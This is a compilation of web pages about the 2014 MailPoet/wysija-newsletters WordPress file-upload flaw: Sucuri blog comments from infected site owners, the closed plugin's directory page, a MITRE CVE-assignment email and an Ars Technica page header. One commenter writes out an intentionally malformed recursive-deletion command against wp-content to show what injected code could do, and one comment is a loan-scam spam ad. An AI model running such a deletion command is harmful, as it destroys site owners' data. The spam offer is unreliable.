       1. ![](https://secure.gravatar.com/avatar/48808a702c6aa34f3becc4cf4a27592d?s=60&d=mm&r=g) **xxxMicrobexxx** says: [November 17, 2014 at 6:36 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3802)

          Yes have deleted all the users I found. My hosting service is looking for a way for me to search all customer databases for use 1001001.

          But surely by now someone, even WordPress, has worked out how this happens. Iff someone can inject into every php file, next time the code could be catastrophic. Imagine something like exec yes | mdir -R wp-content/\* (deliberately dodgy)
26. ![](https://secure.gravatar.com/avatar/329f418d3599b05db0f885b2a781bbde?s=60&d=mm&r=g) **goodwille** says: [January 11, 2015 at 10:35 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3804)

    Unfortunately this happened to me around November and I had to Shutdown both my sites. Now I am having a beast of a time geting my apps from WordPress that i paid for.
27. ![](https://secure.gravatar.com/avatar/f16d13c642088bb68444dbd5abd61071?s=60&d=mm&r=g) **Guest** says: [February 16, 2015 at 9:04 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-6135)

    Both are important. a) Having regular backups. b) Keep an eye on your website files. How to do that? use some kind of automated solution. I know about backup. I use EverLive to take automatic backups at defined intervals. It’s free. Not sure about the best method to detect if my website script is compromised. Specially when I am looking for a free one. Yeah, income from Adsense is very little.
28. ![](https://secure.gravatar.com/avatar/a96e96998e7648f120639d9c52618a7d?s=60&d=mm&r=g) **slayer king** says: [February 28, 2015 at 10:49 am](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-3805)

    wich sites have been infected
29. ![](https://secure.gravatar.com/avatar/3a4b86e35de54aeecb6094aca4b3cac3?s=60&d=mm&r=g) **gio** says: [October 10, 2015 at 1:38 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-6829)

    Hi Peter. My site definitely has been injected by this malware. One question though. If I upload the clean back-up they would still be able to get back in right? It won’t solve the problem I suppose?
30. ![](https://secure.gravatar.com/avatar/ea7b2b4d137a33cb4382d59a7b056208?s=60&d=mm&r=g) **michael** says: [January 13, 2016 at 8:33 pm](https://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html#comment-7229)

    Do you need a quick long or short term first class financial offer of different categories such as business, personal, home, auto, student, debt consolidation finance e.t.c. no matter your credit score. We are guaranteed in giving out financial services to our numerous clients all over world. With our flexible lending packages, funds can be processed and transferred to the borrower within the shortest time possible, contact our specialist for advice and finance planning. contact us today at faircentloancompany@gmail.com

Comments are closed.

##### Related Categories

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)
##### You May Also Like

 ![Labs Note](https://blog.sucuri.net/wp-content/uploads/2020/07/sucuri-labs-og1-390x181.png)

* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [WordPrssAPI Steals Your Cookies](https://blog.sucuri.net/2017/04/wordprssapi-steals-your-cookies.html)

* [![](https://secure.gravatar.com/avatar/814d8a855f60f285a7501fd7d0b13e17?s=20&d=mm&r=g)Cesar Anjos](https://blog.sucuri.net/author/cesarsucuri-net "View all posts by Cesar Anjos")
* April 25, 2017
 Cookies are an important part of a visiting session on a website. It is used not only to keep track of actions taken on a…  [Read the Post](https://blog.sucuri.net/2017/04/wordprssapi-steals-your-cookies.html)  ![Labs Note](https://blog.sucuri.net/wp-content/uploads/2020/07/sucuri-labs-og1-390x181.png)

* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Leveraging Stored Procedures for Nefarious Purposes](https://blog.sucuri.net/2019/06/leveraging-stored-procedures-for-nefarious-purposes.html)

* [![](https://secure.gravatar.com/avatar/c2efe495c70f8f045614e18012cd2ff2?s=20&d=mm&r=g)Bruno Zanelato](https://blog.sucuri.net/author/bruno "View all posts by Bruno Zanelato")
* June 19, 2019
 Here at Sucuri, we clean thousands of websites on a daily basis, and while some of them are easy to solve, others may require more…  [Read the Post](https://blog.sucuri.net/2019/06/leveraging-stored-procedures-for-nefarious-purposes.html)  ![Online Credit Card Theft - A Brief Overview of Online Fraud and Abuse](https://blog.sucuri.net/wp-content/uploads/2019/10/10282019_Fake_Police_Extortion_Scam_social-390x204.png)

* [Security Advisory](https://blog.sucuri.net/category/security-advisory)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)

## [Fake French Police Sextortion Scam](https://blog.sucuri.net/2019/10/fake-french-police-sextortion-scam.html)

* [![](https://secure.gravatar.com/avatar/b020abf59d6245e6b2a4635063322498?s=20&d=mm&r=g)Luke Leal](https://blog.sucuri.net/author/luke "View all posts by Luke Leal")
* October 28, 2019
 There has been a noted increase in the number of sextortion scams during 2019. These scam campaigns are commonly distributed through email, but any method…  [Read the Post](https://blog.sucuri.net/2019/10/fake-french-police-sextortion-scam.html)    ![](https://blog.sucuri.net/wp-content/uploads/2023/05/23-BlogPost_Feature-Image_1490x700_What-is-XML-RPC_A-Guide-to-xml-rpc.php_Security-Risks-How-to-Disable-390x183.jpg)

* [Security Education](https://blog.sucuri.net/category/security-education)
* [Web Pros](https://blog.sucuri.net/category/web-pros)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [What is XML-RPC? Security Risks & How to Disable](https://blog.sucuri.net/2023/05/what-is-xml-rpc-security-risks-how-to-disable.html)

* [![](https://secure.gravatar.com/avatar/a3ef43c4765fe447a305b82f38ea7bd1?s=20&d=mm&r=g)Rianna MacLeod](https://blog.sucuri.net/author/rianna "View all posts by Rianna MacLeod")
* May 4, 2023
 XML-RPC is a protocol designed for WordPress to standardize communication between different systems, allowing external applications (such as other blogging platforms and desktop clients) to…  [Read the Post](https://blog.sucuri.net/2023/05/what-is-xml-rpc-security-risks-how-to-disable.html)  ![Replica Spam on Poorly Maintained ASP Sites](https://blog.sucuri.net/wp-content/uploads/2019/05/05062019-replica-spam-on-poorly-maintained-asp-site_blog-390x183.png)

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)

## [Replica Spam on Poorly Maintained ASP Site](https://blog.sucuri.net/2019/05/replica-spam-on-poorly-maintained-asp-sites.html)

* [![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=20&d=mm&r=g)Denis Sinegubko](https://blog.sucuri.net/author/denis "View all posts by Denis Sinegubko")
* May 6, 2019
 Although the majority of sites we work on are powered by PHP, we still have clients whose sites use other programming languages. The other day…  [Read the Post](https://blog.sucuri.net/2019/05/replica-spam-on-poorly-maintained-asp-sites.html)  ![](https://blog.sucuri.net/wp-content/uploads/2017/01/01172017-vbulletin-malware-when-hackers-compete-for-backdoor-control-EN_blog-390x183.jpg)

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)

## [vBulletin Malware – When Hackers Compete for Backdoor Control](https://blog.sucuri.net/2017/01/vbulletin-malware-hackers-compete-backdoor-control.html)

* [![](https://secure.gravatar.com/avatar/814d8a855f60f285a7501fd7d0b13e17?s=20&d=mm&r=g)Cesar Anjos](https://blog.sucuri.net/author/cesarsucuri-net "View all posts by Cesar Anjos")
* January 17, 2017
 A common pattern we see in compromised websites is the presence of backdoors and other malicious code.  During Q3 of 2016, we found that 72%…  [Read the Post](https://blog.sucuri.net/2017/01/vbulletin-malware-hackers-compete-backdoor-control.html)  ![WordPress Hacked: WHat to do when your site is compromised](https://blog.sucuri.net/wp-content/uploads/2024/02/Blog-Post-Tips-to-Prevent-a-WordPress-Hack-390x183.png)

* [Security Education](https://blog.sucuri.net/category/security-education)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [WordPress Hacked: What to Do When Your Site is Compromised](https://blog.sucuri.net/2024/02/wordpress-hacked.html)

* [![](https://secure.gravatar.com/avatar/a3ef43c4765fe447a305b82f38ea7bd1?s=20&d=mm&r=g)Rianna MacLeod](https://blog.sucuri.net/author/rianna "View all posts by Rianna MacLeod")
* February 23, 2024
 OK – your WordPress site is hacked. Now what? Questions we frequently get from new users are, “Why was my WordPress site hacked?” and “What…  [Read the Post](https://blog.sucuri.net/2024/02/wordpress-hacked.html)  ![Labs Note](https://blog.sucuri.net/wp-content/uploads/2020/07/sucuri-labs-og-abstract-1-390x205.png)

* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)

## [Malicious One-Liner Using Hastebin](https://blog.sucuri.net/2020/09/malicious-one-liner-using-hastebin.html)

* [![](https://secure.gravatar.com/avatar/df2487806812cf3a45af64a37a1e0daf?s=20&d=mm&r=g)Krasimir Konov](https://blog.sucuri.net/author/krasimir "View all posts by Krasimir Konov")
* September 23, 2020
 Short scripts that deliver malware to a website are nothing new, but during a recent investigation we found a script using hastebin[.]com, which is a…  [Read the Post](https://blog.sucuri.net/2020/09/malicious-one-liner-using-hastebin.html)  ![Labs Note](https://blog.sucuri.net/wp-content/uploads/2020/07/sucuri-labs-og1-390x181.png)

* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)

## [Monetized JavaScript Redirect to Free Porn Webcams for Mobile Devices](https://blog.sucuri.net/2017/03/monetized-javascript-redirect-to-free-porn-webcams-for-mobile-devices.html)

* [![](https://secure.gravatar.com/avatar/d71cd401695ddbba25a344d2d9ed0a24?s=20&d=mm&r=g)Yuliyan Tsvetkov](https://blog.sucuri.net/author/yuliyan "View all posts by Yuliyan Tsvetkov")
* March 2, 2017
 Attackers will do desperate and obvious things to boost the views of their ‘customers’. On a daily basis we find different malicious redirects (some are…  [Read the Post](https://blog.sucuri.net/2017/03/monetized-javascript-redirect-to-free-porn-webcams-for-mobile-devices.html)    ![Elementor Pro WordPress Plugin Vulnerability](https://blog.sucuri.net/wp-content/uploads/2023/03/BlogPost_FeatureImage_1490x700_ELEMENTOR-390x183.jpg)

* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [High Severity Vulnerability in WordPress Elementor Pro Patched](https://blog.sucuri.net/2023/03/high-severity-vulnerability-in-wordpress-elementor-pro-patched.html)

* [![](https://secure.gravatar.com/avatar/fcf2c7b3195ff9058d29af3b8a49fc43?s=20&d=mm&r=g)Ben Martin](https://blog.sucuri.net/author/benmartin "View all posts by Ben Martin")
* March 31, 2023
 On March 22nd, 2023 a security patch was issued for the popular website builder plugin Elementor Pro. Website administrators using this plugin should immediately patch…  [Read the Post](https://blog.sucuri.net/2023/03/high-severity-vulnerability-in-wordpress-elementor-pro-patched.html)
##### Search

 Search for:  Search[![Website Malware Guide Sidebar](https://blog.sucuri.net/wp-content/uploads/2024/02/Website-Malware-Guide-Sidebar.jpg)](https://sucuri.net/guides/website-malware/)[![WordPress Security Guide Sidebar](https://blog.sucuri.net/wp-content/uploads/2024/02/WordPress-Security-Guide-Sidebar.jpg)](https://sucuri.net/guides/wordpress-security/)[![](https://blog.sucuri.net/wp-content/uploads/2023/04/23-sucuri-newsletter-blog-banner.png)](https://info.sucuri.net/subscribe-to-security)[![Sucuri Sidebar Malware Removal to Signup Page](https://blog.sucuri.net/wp-content/uploads/2023/08/23-sucuri-blog-sidebar-banner-need-help-cleaning-up-malware-on-your-website-get-help-now-new.png)](https://sucuri.net/website-security-platform/signup/) ![Sucuri Logo](https://sucuri.net/wp-content/uploads/2022/12/sucuri_logo_dark.svg)

Let’s Connect

        [Products](https://sucuri.net/website-security/)   [Website Firewall](https://sucuri.net/website-firewall/)   [Website Security Platform](https://sucuri.net/website-security-platform/)   [WordPress Security](https://sucuri.net/wordpress-security/)   [Website Backups](https://sucuri.net/website-backups/)   [Hack Assistance](https://sucuri.net/website-security-platform/help-now/)   [Pricing](https://sucuri.net/website-security-platform/signup)   [Solutions](https://sucuri.net/ddos-protection/)   [DDoS Protection](https://sucuri.net/ddos-protection/)   [Malware Detection](https://sucuri.net/malware-detection-scanning/)   [Malware Removal](https://sucuri.net/website-malware-removal/)   [Malware Prevention](https://sucuri.net/website-hack-protection/)   [Blacklist Removal](https://sucuri.net/website-security-platform/blocklist-removal-and-repair/)   [SEO Spam Removal](https://sucuri.net/seo-spam-removal/)  USE CASES  [Developers](https://sucuri.net/developers/)   [Ecommerce](https://sucuri.net/ecommerce-website-security/)   [Agency Plans](https://sucuri.net/custom/agency/)   [Enterprise Services](https://sucuri.net/custom/agency/)   [HTTPS/2](https://sucuri.net/http-2-rapid-reset/)   [Virtual Patching](https://sucuri.net/virtual-patching/)   [Support](https://docs.sucuri.net/)   [Knowledge Base](https://docs.sucuri.net/)   [SiteCheck](https://sitecheck.sucuri.net/)   [Guides](https://sucuri.net/guides/)   [Research Labs](https://labs.sucuri.net/)   [Report Abuse](https://abuse.sucuri.net/)   [Status Report](https://status.sucuri.net/)   [Company](https://sucuri.net/company/)   [About Sucuri](https://sucuri.net/company/)   [Contact](https://sucuri.net/company/contact-us/)   [Blog](https://blog.sucuri.net/)   [Referral](https://sucuri.net/referral/)   [Partners](https://sucuri.net/partners/)   [Testimonials](https://sucuri.net/customers/)  [Terms of Use](https://sucuri.net/terms/) [Privacy Policy](https://sucuri.net/privacy/) [Do Not Sell My Personal Information](https://sucuri.net/cookies/) [Frequently Asked Questions](https://sucuri.net/faq/)

© 2025 GoDaddy Mediatemple, Inc., d/b/a Sucuri. All rights reserved.

   [back to top](#top "Going Top")  X

Sucuri Cookie Policy
 [See our policy>>](https://sucuri.net/cookies)

Our website uses cookies, which help us to improve our site and enables us to deliver the best possible service and customer experience.

 Accept Decline Manage Options

=== Content from wordpress.org_185329ee_20250126_122929.html ===


[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Showcase](https://wordpress.org/showcase/)
* [Hosting](https://wordpress.org/hosting/)
* Extend
  + [Themes](https://wordpress.org/themes/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Blocks](https://wordpress.org/blocks/)
  + [Openverse ↗︎](https://openverse.org/)
* Learn
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* Community
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [Events](https://events.wordpress.org/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* About
  + [About WordPress](https://wordpress.org/about/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
* [Get WordPress](https://wordpress.org/download/)

Search in WordPress.org

[Get WordPress](https://wordpress.org/download/)

[WordPress.org](https://wordpress.org/)

[Plugin Directory](https://wordpress.org/plugins/)

MailPoet Newsletters (Previous)

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Fwysija-newsletters&locale=en_US)

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Fwysija-newsletters&locale=en_US)

Search plugins

![](https://s.w.org/plugins/geopattern-icon/wysija-newsletters_ffddcc.svg)
# wysija-newsletters

* [Details](https://wordpress.org/plugins/wysija-newsletters/#description)
* [Reviews](https://wordpress.org/plugins/wysija-newsletters/#reviews)
* [Development](https://wordpress.org/plugins/wysija-newsletters/#developers)

[Support](https://wordpress.org/support/plugin/wysija-newsletters/)

## Description

This plugin has been closed as of August 22, 2022 and is not available for download. This closure is permanent. Reason: Author Request.

## Reviews

![](https://secure.gravatar.com/avatar/c6ee689e87276ba2767a1f86e22c4d014996c9b69f05397812a8c3708af97069?s=60&d=retro&r=g)
### [Auto creates a list ? Why ?](https://wordpress.org/support/topic/auto-creates-a-list-why/)

[futa](https://profiles.wordpress.org/andyturner1/ "Posts by futa")
July 17, 2021

I want full control of my lists, so when i install this plugin it automatically creates a newsletter list with members I already have on my site, I don’t want that. Stop trying to guess what your customers want.

![](https://secure.gravatar.com/avatar/d1c60692d93cb91573459a7e6223810242444147bb2e5c51a09270d843d1057b?s=60&d=retro&r=g)
### [Good previous version](https://wordpress.org/support/topic/good-previous-version-2/)

[toccodelcuore](https://profiles.wordpress.org/toccodelcuore/ "Posts by toccodelcuore")
October 15, 2020

Good previous version

![](https://secure.gravatar.com/avatar/9d445973a98c744904d7f8a0d590e7ee651ca5c071bdb423baeeb8900d3b1675?s=60&d=retro&r=g)
### [That’s the biggest scrap](https://wordpress.org/support/topic/thats-the-biggest-scrap/)

[atelierunghia](https://profiles.wordpress.org/atelierunghia/ "Posts by atelierunghia")
November 13, 2019

This is a plugin that you should not use.
Constantly only SMTP problems. Lastly, the plung goes into the “pause” status, alleged SMTP error, but this is not true.
The developers want to reach dmit only that you subscribe to your service to ship. We switch back to Mailster.

![](https://secure.gravatar.com/avatar/1c6fb83a8d87915dacd35066fbf67fc777791f6dc9b2f1749798d6522f085402?s=60&d=retro&r=g)
### [One word, Awesome!](https://wordpress.org/support/topic/one-word-awesome-14/)

[rajinder4981](https://profiles.wordpress.org/rajinder4981/ "Posts by rajinder4981")
August 17, 2019

One word, Awesome!

![](https://secure.gravatar.com/avatar/6e368898134c258221493d3132eda83c4fe54f74cb2bdd11ecb176b868b58a61?s=60&d=retro&r=g)
### [Useful, but should be more intuitive](https://wordpress.org/support/topic/dont-work-update-causes-sql-errors/)

[comxcom](https://profiles.wordpress.org/comxcom/ "Posts by comxcom")
March 25, 2019

Since last update, I get an error message “données WordPress : [Unknown collation: ‘utf8’]”… So I think it’s better for me to trash MailPoet. Don’t understand !!
[new review:]
I finally solved the issue.
The line [define(‘DB\_COLLATE’, ”);] was set to ‘utf8-general-ci’
I restored it at its default value (”) then all rocks.
The plugins works well now, but the its use should be more intuitive.
Useful

![](https://secure.gravatar.com/avatar/8906b406710792fb14593f6ab44c860136dc3c25b80024d1e85cda1626a6f71d?s=60&d=retro&r=g)
### [Good previous version](https://wordpress.org/support/topic/good-previous-version/)

[dariush11](https://profiles.wordpress.org/dariush11/ "Posts by dariush11")
February 19, 2019

I liked your plugin and used it for years. But the new build of plugin is terrible and version by version it falls down and down. Now we can’t use it in any of our sites at all, and want to come back to this version. Is it possible for us to use this version?

[Read all 2,714 reviews](https://wordpress.org/support/plugin/wysija-newsletters/reviews/)
## Contributors & Developers

“MailPoet Newsletters (Previous)” is open source software. The following people have contributed to this plugin.

Contributors

* ![](https://secure.gravatar.com/avatar/dac6e84d13c545b34d1bdd3a39583fc21ae903a7f24936ec95f9c4059f76648c?s=32&d=mm&r=g) [MailPoet](https://profiles.wordpress.org/mailpoet/)

“MailPoet Newsletters (Previous)” has been translated into 22 locales. Thank you to [the translators](https://translate.wordpress.org/projects/wp-plugins/wysija-newsletters/contributors) for their contributions.

[Translate “MailPoet Newsletters (Previous)” into your language.](https://translate.wordpress.org/projects/wp-plugins/wysija-newsletters)

### Interested in development?

[Browse the code](https://plugins.trac.wordpress.org/browser/wysija-newsletters/), check out the [SVN repository](https://plugins.svn.wordpress.org/wysija-newsletters/), or subscribe to the [development log](https://plugins.trac.wordpress.org/log/wysija-newsletters/) by [RSS](https://plugins.trac.wordpress.org/log/wysija-newsletters/?limit=100&mode=stop_on_copy&format=rss).

## Meta

* Version **2.22**
* Last updated **2 years ago**
* Active installations **N/A**
* WordPress version **3.5 or higher**
* Tested up to **5.5.15**
* Languages
  See all 23

  Close

  [Croatian](https://hr.wordpress.org/plugins/wysija-newsletters/), [Czech](https://cs.wordpress.org/plugins/wysija-newsletters/), [Danish](https://da.wordpress.org/plugins/wysija-newsletters/), [Dutch](https://nl.wordpress.org/plugins/wysija-newsletters/), [English (US)](https://wordpress.org/plugins/wysija-newsletters/), [French (France)](https://fr.wordpress.org/plugins/wysija-newsletters/), [German](https://de.wordpress.org/plugins/wysija-newsletters/), [Italian](https://it.wordpress.org/plugins/wysija-newsletters/), [Japanese](https://ja.wordpress.org/plugins/wysija-newsletters/), [Moroccan Arabic](https://ary.wordpress.org/plugins/wysija-newsletters/), [Occitan](https://oci.wordpress.org/plugins/wysija-newsletters/), [Portuguese (Angola)](https://pt-ao.wordpress.org/plugins/wysija-newsletters/), [Portuguese (Brazil)](https://br.wordpress.org/plugins/wysija-newsletters/), [Portuguese (Portugal)](https://pt.wordpress.org/plugins/wysija-newsletters/), [Romanian](https://ro.wordpress.org/plugins/wysija-newsletters/), [Russian](https://ru.wordpress.org/plugins/wysija-newsletters/), [Slovak](https://sk.wordpress.org/plugins/wysija-newsletters/), [Spanish (Mexico)](https://es-mx.wordpress.org/plugins/wysija-newsletters/), [Spanish (Spain)](https://es.wordpress.org/plugins/wysija-newsletters/), [Spanish (Venezuela)](https://ve.wordpress.org/plugins/wysija-newsletters/), [Swedish](https://sv.wordpress.org/plugins/wysija-newsletters/), [Turkish](https://tr.wordpress.org/plugins/wysija-newsletters/), and [Ukrainian](https://uk.wordpress.org/plugins/wysija-newsletters/).

  [Translate into your language](https://translate.wordpress.org/projects/wp-plugins/wysija-newsletters)
* [Advanced View](https://wordpress.org/plugins/wysija-newsletters/advanced/)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Privacy](https://wordpress.org/about/privacy/)

* [Showcase](https://wordpress.org/showcase/)
* [Themes](https://wordpress.org/themes/)
* [Plugins](https://wordpress.org/plugins/)
* [Patterns](https://wordpress.org/patterns/)

* [Learn](https://learn.wordpress.org/)
* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [WordPress.tv ↗](https://wordpress.tv/)

* [Get Involved](https://make.wordpress.org/)
* [Events](https://events.wordpress.org/)
* [Donate ↗](https://wordpressfoundation.org/donate/)
* [Five for the Future](https://wordpress.org/five-for-the-future/)

* [WordPress.com ↗](https://wordpress.com/?ref=wporg-footer)
* [Matt ↗](https://ma.tt/)
* [bbPress ↗](https://bbpress.org/)
* [BuddyPress ↗](https://buddypress.org/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our X (formerly Twitter) account](https://www.x.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)
* [Visit our YouTube channel](https://www.youtube.com/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from www.openwall.com_25e0ec55_20250125_223245.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](6) [[next>]](8) [[<thread-prev]](../../../2014/07/02/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <201407081641.s68GfDNw028028@linus.mitre.org>
Date: Tue, 8 Jul 2014 12:41:13 -0400 (EDT)
From: cve-assign@...re.org
To: henri@...v.fi
Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
Subject: Re: CVE request: WordPress plugin wysija-newsletters remote file upload

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

> <https://wordpress.org/plugins/wysija-newsletters/changelog/>
> 2.6.7 - 2014-07-01
> Fixed security issue reported by Sucuri
> <http://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html>

> the developers assumed that WordPress's "admin_init" hooks were only
> called when an administrator user visited a page inside /wp-admin/.

> It is a easy mistake to make and they used that hook (admin_init) to
> verify if a specific user was allowed to upload files.

Use CVE-2014-4725.

> <https://wordpress.org/plugins/wysija-newsletters/changelog/>
> 2.6.8 - 2014-07-04
> Fixed security issue reported by Dominic

This seems to be an unspecified vulnerability with a different
discoverer. Use CVE-2014-4726.

> <http://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html>

> WordPress's "admin_init" hooks

> any call to /wp-admin/admin-post.php also executes this hook without
> requiring the user to be authenticated

As far as we can tell, this is intentional behavior in WordPress, and
is not a WordPress implementation error or vulnerability. There is no
CVE ID for this WordPress behavior.

- --
CVE assignment team, MITRE CVE Numbering Authority
M/S M300
202 Burlington Road, Bedford, MA 01730 USA
[ PGP key available through <http://cve.mitre.org/cve/request_id.html> ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.14 (SunOS)

iQEcBAEBAgAGBQJTvB7EAAoJEKllVAevmvmsXpAH/2HeRED+w5BlsPaGIkGFXaqT
FGdOCgYyjfwCISZQqaIvUds81sKJMewfcv/2naoY+MU2/IWDAPME8vAFuJiZpwPq
SL8BsUlIB4D0uizC/vhJHuf4G7Fw0+qlTy2O2nMdcZ+5TZlu626M7WvRUE4pJj37
q86dmqqnF9CjiQWLBx2UKb0xLfrCGBQyqXMjZlvvyTI7wbZLjwFoxSJ4UqNM1My1
5LkY4L3DGyGaNrrNZOdM3OGKhNtTrJl630TIqhwu+hnKIvrY5N2WPFHHoZ2V7K8P
QFktGYlW5zej5jGi11ZGX5bWa8sWtBYQNXge9AUjQSaiaSSuDNkoey3dgx5Mk5E=
=dY+t
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from arstechnica.com_84d5ac34_20250125_223236.html ===


[Skip to content](#main)

[Ars Technica home](https://arstechnica.com/)

Sections

[Forum](/civis/)

[Subscribe](/store/product/subscriptions/)

* [AI](https://arstechnica.com/ai/)
* [Biz & IT](https://arstechnica.com/information-technology/)
* [Cars](https://arstechnica.com/cars/)
* [Culture](https://arstechnica.com/culture/)
* [Gaming](https://arstechnica.com/gaming/)
* [Health](https://arstechnica.com/health/)
* [Policy](https://arstechnica.com/tech-policy/)
* [Science](https://arstechnica.com/science/)
* [Security](https://arstechnica.com/security/)
* [Space](https://arstechnica.com/space/)
* [Tech](https://arstechnica.com/gadgets/)

* [Feature](/features/)
* [Reviews](/reviews/)
* [Store](/store/)

* [AI](https://arstechnica.com/ai/)
* [Biz & IT](https://arstechnica.com/information-technology/)
* [Cars](https://arstechnica.com/cars/)
* [Culture](https://arstechnica.com/culture/)
* [Gaming](https://arstechnica.com/gaming/)
* [Health](https://arstechnica.com/health/)
* [Policy](https://arstechnica.com/tech-policy/)
* [Science](https://arstechnica.com/science/)
* [Security](https://arstechnica.com/security/)
* [Space](https://arstechnica.com/space/)
* [Tech](https://arstechnica.com/gadgets/)

[Forum](/civis/)

[Subscribe](/store/product/subscriptions/)

Story text

Size
Small
Standard
Large

Width
\*

Standard
Wide

Links
Standard
Orange

\* Subscribers only

  [Learn more](/store/product/subscriptions/)

Pin to story

Theme

* HyperLight
* Day & Night
* Dark
* System

Search dialog...

Sign In

Sign in dialog...

Sign in

WEBSITE EXPLOITS GO WILD

